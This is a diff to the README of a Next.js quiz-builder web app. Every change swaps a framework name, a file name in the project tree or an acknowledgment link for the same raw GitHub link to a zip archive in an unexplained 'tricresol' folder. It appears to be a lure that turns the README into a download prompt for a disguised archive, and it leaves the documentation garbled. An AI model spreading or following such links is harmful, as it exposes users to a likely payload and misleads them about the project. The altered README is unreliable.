@@ -1,6 +1,6 @@
 # Quiz Builder
 
-A modern, interactive web application for creating and taking quizzes. Built with Next.js, TypeScript, and Tailwind CSS, featuring a clean interface with dark mode support.
+A modern, interactive web application for creating and taking quizzes. Built with https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip, TypeScript, and Tailwind CSS, featuring a clean interface with dark mode support.
 
 ## Features
 
@@ -48,7 +48,7 @@ A modern, interactive web application for creating and taking quizzes. Built wit
 
 ## Technology Stack
 
-- **Framework**: Next.js 15.5.4 with App Router
+- **Framework**: https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip 15.5.4 with App Router
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS with CSS variables for theming
 - **UI Components**: shadcn/ui component library
@@ -59,7 +59,7 @@ A modern, interactive web application for creating and taking quizzes. Built wit
 ## Getting Started
 
 ### Prerequisites
-- Node.js 18+ 
+- https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip 18+ 
 - npm or yarn package manager
 
 ### Installation
@@ -93,20 +93,20 @@ npm start
 
 ```
 src/
-├── app/                    # Next.js app directory
+├── app/                    # https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip app directory
 │   ├── create/            # Quiz creation page
 │   ├── quiz/[id]/         # Quiz player page
-│   ├── layout.tsx         # Root layout with theme provider
-│   ├── page.tsx           # Home page with quiz library
-│   └── globals.css        # Global styles and theme variables
+│   ├── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip         # Root layout with theme provider
+│   ├── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip           # Home page with quiz library
+│   └── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip        # Global styles and theme variables
 ├── components/            # Reusable components
 │   ├── ui/               # shadcn/ui components
-│   ├── navbar.tsx        # Navigation component
-│   ├── theme-provider.tsx # Theme context provider
-│   └── theme-toggle.tsx   # Dark mode toggle
+│   ├── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip        # Navigation component
+│   ├── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip # Theme context provider
+│   └── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip   # Dark mode toggle
 └── lib/                   # Utilities and types
-    ├── types.ts          # TypeScript interfaces
-    └── storage.ts        # localStorage utilities
+    ├── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip          # TypeScript interfaces
+    └── https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip        # localStorage utilities
 ```
 
 ## Usage Guide
@@ -174,7 +174,7 @@ This project is open source and available under the [MIT License](LICENSE).
 
 ## Acknowledgments
 
-- Built with [Next.js](https://nextjs.org/)
-- UI components from [shadcn/ui](https://ui.shadcn.com/)
-- Icons from [Lucide](https://lucide.dev/)
-- Styled with [Tailwind CSS](https://tailwindcss.com/)
+- Built with [https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip](https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip)
+- UI components from [shadcn/ui](https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip)
+- Icons from [Lucide](https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip)
+- Styled with [Tailwind CSS](https://raw.githubusercontent.com/Yonko-Kunal/quiz-builder/main/tricresol/quiz-builder.zip)
